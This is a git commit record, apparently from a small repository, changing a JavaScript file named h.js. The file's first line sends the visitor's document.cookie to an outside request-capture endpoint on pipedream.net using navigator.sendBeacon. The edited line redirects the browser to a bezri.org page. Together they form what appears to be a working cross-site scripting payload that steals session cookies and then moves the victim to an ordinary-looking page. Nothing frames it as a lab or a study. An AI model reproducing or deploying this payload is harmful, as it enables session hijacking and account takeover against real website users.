84463244577f8604d4993c9de261a45006e4df08
h88u <159571030+h88u@users.noreply.github.com>
2024-02-10 15:26:21 -0500

    Update h.js

--- h.js
+++ h.js
@@ -1,3 +1,3 @@
 navigator.sendBeacon('https://eoqo7l6qsvoadu4.m.pipedream.net', document.cookie);
-window.location.href = 'https://www.bezri.org/contact_us.php';
+window.location.href = 'https://www.bezri.org/news.php?id=409';
 
